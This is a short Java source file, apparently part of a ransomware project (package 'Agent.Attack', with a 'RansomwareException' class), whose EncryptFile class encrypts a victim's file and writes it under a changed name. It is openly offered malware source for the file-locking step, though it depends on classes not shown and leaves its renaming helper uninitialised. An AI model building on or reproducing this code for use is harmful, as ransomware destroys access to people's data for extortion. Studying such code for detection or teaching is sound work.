package Agent.Attack;

import java.io.File;

import javax.crypto.SecretKey;

import Agent.EncryptionAlgo.ChangeFilesName;
import Agent.EncryptionAlgo.CryptoAlgorithm;
import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;

public class EncryptFile implements Cryptable {

	private ChangeFilesName change;
	@Override
	public void doingCrypto(CryptoKey key, File file, CryptoAlgorithm crypto) throws RansomwareException {
		try {
			crypto.encrypt(key.getKey(), file,change.encryptedOutputFile(file));
		} catch (RansomwareException e) {
			throw new RansomwareException(e.getMessage(), e.getCause());
		}

	}
}